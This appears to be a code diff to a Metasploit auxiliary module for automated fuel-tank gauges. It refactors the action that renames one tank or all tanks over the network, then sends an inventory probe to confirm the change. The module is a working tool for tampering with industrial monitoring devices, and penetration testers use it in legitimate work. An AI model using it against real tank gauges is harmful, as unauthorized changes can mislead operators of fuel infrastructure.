@@ -199,17 +199,31 @@ class Metasploit3 < Msf::Auxiliary
       connect
       case action.name
       when 'SET_TANK_NAME'
-        vprint_status("#{peer} -- setting tank ##{tank_number} to #{tank_name}")
-        request = action.opts[protocol + '_CMD'] + "#{format('%02d', tank_number)}#{tank_name}\n"
+        # send the set tank name command to change the tank name(s)
+        if tank_number == 0
+          vprint_status("#{peer} -- setting all tank names to #{tank_name}")
+        else
+          vprint_status("#{peer} -- setting tank ##{tank_number}'s name to #{tank_name}")
+        end
+        request = "#{action.opts[protocol + '_CMD']}#{format('%02d', tank_number)}#{tank_name}\n"
         sock.put(request)
+        # reconnect
         disconnect
         connect
-        sock.put(actions.find { |a| a.name == 'INVENTORY' }.opts[protocol + '_CMD'] + "\n")
-        print_status("#{peer} #{datastore['PROTOCOL']} #{action.opts['Description']}:\n#{sock.get_once}")
+        # send an inventory probe to show that it succeeded
+        inventory_probe = "#{actions.find { |a| a.name == 'INVENTORY' }.opts[protocol + '_CMD']}\n"
+        sock.put(inventory_probe)
+        inventory_response = sock.get_once # XXX: timeout?
+        message = "#{peer} #{protocol} #{action.opts['Description']}:\n#{inventory_response}"
+        if inventory_response.include?(tank_name)
+          print_good message
+        else
+          print_warning message
+        end
       else
-        request = action.opts[datastore['PROTOCOL'] + '_CMD'] + "\n"
+        request = "#{action.opts[protocol + '_CMD']}\n"
         sock.put(request)
-        print_status("#{peer} #{datastore['PROTOCOL']} #{action.opts['Description']}:\n#{sock.get_once}")
+        print_status("#{peer} #{protocol} #{action.opts['Description']}:\n#{sock.get_once}")
       end
     ensure
       disconnect
